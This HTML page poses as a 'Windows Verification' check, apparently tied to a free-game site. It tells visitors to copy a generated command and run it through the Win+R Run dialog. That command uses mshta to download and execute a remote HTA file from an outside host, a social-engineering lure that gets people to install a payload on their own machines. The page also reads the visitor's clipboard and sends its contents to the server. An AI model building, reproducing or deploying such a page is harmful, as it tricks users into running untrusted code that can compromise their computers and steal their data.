<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Windows Verification</title>
  <style>
    body {
      background: #111;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    .cmd {
      background: #222;
      padding: 15px;
      margin: 20px auto;
      border-radius: 8px;
      display: inline-block;
      font-family: monospace;
      font-size: 0.9rem;
      user-select: all;
      max-width: 90%;
      word-break: break-all;
      border: 1px solid #444;
    }
    .btn {
      background: #5865F2;
      color: #fff;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin: 10px;
    }
    .btn:hover {
      background: #4752c4;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
    }
    .step {
      background: #222;
      padding: 15px;
      margin: 10px auto;
      border-radius: 8px;
      max-width: 600px;
      text-align: left;
    }
  </style>
</head>
<body>
  <h2>üîê Windows Verification Required</h2>
  
  <div class="step">
    <h3>Step 1: Copy the command below</h3>
    <div class="cmd" id="cmdBox">Loading...</div>
    <button class="btn" onclick="copyCommand()">üìã Copy Command</button>
  </div>

  <div class="step">
    <h3>Step 2: Run the command</h3>
    <p>1. Press <kbd>Win + R</kbd> to open Run dialog</p>
    <p>2. Paste the command and press Enter</p>
    <p>3. Wait for the popup message</p>
  </div>

  <div class="step">
    <h3>Step 3: Verify</h3>
    <button class="btn" onclick="verifyCode()">‚úÖ I ran the command - Verify me!</button>
  </div>

  <p id="result"></p>

  <script>
    let code = "";
    
    // Generate verification code
    fetch("/generate-verification-code")
      .then(res => res.json())
      .then(data => {
        code = data.code;
        // Create the mshta command with the code as a parameter
        const cmd = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"`;
        document.getElementById("cmdBox").textContent = cmd;
        window.generatedCommand = cmd;
      })
      .catch(err => {
        document.getElementById("cmdBox").textContent = "Error loading verification code";
        console.error(err);
      });

    function copyCommand() {
      if (window.generatedCommand) {
        navigator.clipboard.writeText(window.generatedCommand).then(() => {
          alert("‚úÖ Command copied to clipboard!\n\nNow press Win+R, paste, and press Enter.");
        }).catch(() => {
          // Fallback for older browsers
          const textArea = document.createElement("textarea");
          textArea.value = window.generatedCommand;
          document.body.appendChild(textArea);
          textArea.select();
          document.execCommand('copy');
          document.body.removeChild(textArea);
          alert("‚úÖ Command copied to clipboard!\n\nNow press Win+R, paste, and press Enter.");
        });
      }
    }

    function verifyCode() {
      document.getElementById("result").textContent = "üîÑ Checking clipboard...";
      
      navigator.clipboard.readText().then(text => {
        fetch("/verify-windows-code", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ clipboard: text })
        })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            document.getElementById("result").style.color = "lime";
            document.getElementById("result").textContent = "‚úÖ Verification successful! Redirecting...";
            document.cookie = "tokenGateVerified=1; path=/; max-age=86400";
            setTimeout(() => {
              window.location.href = "/verifynotwindows";
            }, 1500);
          } else {
            document.getElementById("result").style.color = "#ff4444";
            document.getElementById("result").textContent = "‚ùå Verification failed. Make sure you ran the command first!";
          }
        })
        .catch(err => {
          document.getElementById("result").style.color = "#ff4444";
          document.getElementById("result").textContent = "‚ùå Network error. Please try again.";
        });
      }).catch(err => {
        document.getElementById("result").style.color = "#ff4444";
        document.getElementById("result").textContent = "‚ùå Could not read clipboard. Make sure you ran the command first!";
      });
    }
  </script>
</body>
</html>
